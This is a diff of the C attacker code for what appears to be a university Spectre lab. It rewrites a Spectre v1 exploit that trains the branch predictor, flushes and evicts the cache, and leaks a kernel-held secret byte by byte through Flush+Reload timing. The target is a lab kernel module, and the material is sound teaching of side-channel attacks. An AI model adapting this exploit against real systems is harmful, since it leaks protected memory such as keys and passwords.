@@ -7,115 +7,116 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
-
-#define CACHE_HIT_THRESHOLD 105
-#define NUM_TRIALS 150      // Reduced from 5000 to drastically speed up scoring
-#define NUM_TRAIN_CALLS 10  // Fewer training loops required
-
-#define EVICT_BUF_SIZE (1 * 1024 * 1024)
-#define EVICT_STRIDE 4096
-
 static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
     spectre_lab_command local_cmd;
     local_cmd.kind = COMMAND_PART3;
     local_cmd.arg1 = (uint64_t)shared_memory;
     local_cmd.arg2 = offset;
+
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
-// 3. Memory: Selective flush (only flush the 256 array indices used for the side-channel)
-static void flush_target_memory(char *shared_memory) {
-    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+static void flush_shared_memory(char *shared_memory) {
+    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
         clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
     }
 }
 
-static void reload_and_score(char *shared_memory, int *scores) {
-    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
-        int idx = ((i * 167) + 13) % SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES;
-        uint64_t t = time_access(&shared_memory[idx * SHD_SPECTRE_LAB_PAGE_SIZE]);
-        if (t < CACHE_HIT_THRESHOLD) {
-            scores[idx]++;
+static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offset) {
+    size_t hit_counts[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
+    size_t best_index = 0, second_index = 0;
+    size_t total_attempts = 700;
+
+    // Cache eviction buffer setup
+    const size_t eviction_size = 4 * 1024 * 1024;
+    static char *eviction_buffer = NULL;
+    if (!eviction_buffer) {
+        eviction_buffer = malloc(eviction_size);
+        if (eviction_buffer) memset(eviction_buffer, 1, eviction_size);
+    }
+
+    // Two-tier attempt system
+    for (int tier = 0; tier < 2; tier++) {
+        for (size_t attempt = 0; attempt < total_attempts; attempt++) {
+            
+            // 1. Train Predictor
+            for (int train = 0; train < 48; train++) {
+                call_kernel_part3(kernel_fd, shared_memory, train & 0x3);
+            }
+
+            // 2. Flush and Thrash
+            flush_shared_memory(shared_memory);
+            if (eviction_buffer) {
+                volatile uint64_t sink = 0;
+                for (size_t k = 0; k < eviction_size; k += 128) sink += eviction_buffer[k];
+            }
+
+            // 3. Victim Call
+            call_kernel_part3(kernel_fd, shared_memory, offset);
+            call_kernel_part3(kernel_fd, shared_memory, offset);
+
+            // 4. Reload and Time (Pseudo-random stride)
+            for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
+                size_t mix_idx = ((i * 167) + 13) & 0xFF;
+                char *addr = shared_memory + (mix_idx * SHD_SPECTRE_LAB_PAGE_SIZE);
+                
+                uint64_t latency = time_access(addr);
+
+                if (latency <= 150) {
+                    hit_counts[mix_idx]++;
+                }
+            }
         }
-    }
-}
 
-// 2. Cache Prep: Faster targeted eviction via strided memory access
-static void evict_cache(char *evict_buf, size_t len) {
-    volatile unsigned char sink = 0;
-    // Paging stride eviction (much faster than a full sequential scan)
-    for (size_t i = 0; i < len; i += EVICT_STRIDE) {
-        sink ^= evict_buf[i];
-    }
-    (void)sink;
-}
-
-static unsigned char leak_byte(int kernel_fd, char *shared_memory, char *evict_buf, size_t offset) {
-    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES];
-    memset(scores, 0, sizeof(scores));
-
-    for (int trial = 0; trial < NUM_TRIALS; trial++) {
-
-        // 1. Training: Use fewer calls to train the Branch Predictor
-        for (int t = 0; t < NUM_TRAIN_CALLS; t++) {
-            call_kernel_part3(kernel_fd, shared_memory, t % 4);
+        // 5. Margin/Confidence Check
+        size_t bc = 0, sc = 0;
+        for (size_t j = 0; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
+            if (hit_counts[j] > bc) {
+                sc = bc; second_index = best_index;
+                bc = hit_counts[j]; best_index = j;
+            } else if (hit_counts[j] > sc) {
+                sc = hit_counts[j]; second_index = j;
+            }
         }
 
-        // Flush target memory AFTER training to keep the signal completely clean
-        flush_target_memory(shared_memory);
-
-        // Evict L1/L2 caches rapidly using the stride approach
-        evict_cache(evict_buf, EVICT_BUF_SIZE);
-
-        __asm__ volatile("mfence" ::: "memory");
-
-        // Single attack call with out-of-bounds offset
-        call_kernel_part3(kernel_fd, shared_memory, offset);
-
-        __asm__ volatile("mfence" ::: "memory");
-
-        // 4. Scoring: Process the fast signals
-        reload_and_score(shared_memory, scores);
+        if (bc >= (sc + 12)) break;
+        total_attempts = 1400; 
     }
 
-    // Find best score, skip index 0 (common noise source in Spectre attacks)
-    int best = 1;
-    for (int i = 2; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
-        if (scores[i] > scores[best]) {
-            best = i;
+    // Early Null-byte logic
+    if (best_index == 0 && offset < 12) {
+        size_t nz_best_idx = 1, nz_best_count = 0;
+        for (size_t j = 1; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
+            if (hit_counts[j] > nz_best_count) {
+                nz_best_count = hit_counts[j];
+                nz_best_idx = j;
+            }
         }
+        return (char)nz_best_idx;
     }
-    return (unsigned char)best;
+
+    return (char)best_index;
 }
 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
-    size_t current_offset = 0;
+    memset(leaked_str, 0, SHD_SPECTRE_LAB_SECRET_MAX_LEN);
 
     printf("Launching attacker\n");
 
-    char *evict_buf = malloc(EVICT_BUF_SIZE);
-    if (!evict_buf) { perror("malloc"); close(kernel_fd); return EXIT_FAILURE; }
-    
-    // Page-in the eviction buffer memory
-    memset(evict_buf, 1, EVICT_BUF_SIZE);
+    for (size_t current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
+        char leaked_byte = leak_byte_at_offset(kernel_fd, shared_memory, current_offset);
 
-    init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+        leaked_str[current_offset] = leaked_byte;
 
-    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1; current_offset++) {
-        unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, evict_buf, current_offset);
-
-        printf("[+] Offset %zu: 0x%02x ('%c')\n", current_offset, leaked_byte,
-               (leaked_byte >= 32 && leaked_byte < 127) ? leaked_byte : '.');
-
-        leaked_str[current_offset] = (char)leaked_byte;
-        if (leaked_byte == '\0') break;
+        // Terminate at Null once minimum length is met
+        if (leaked_byte == '\x00' && current_offset >= 12) {
+            break;
+        }
     }
-    leaked_str[current_offset] = '\0';
 
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
 
-    free(evict_buf);
     close(kernel_fd);
     return EXIT_SUCCESS;
 }
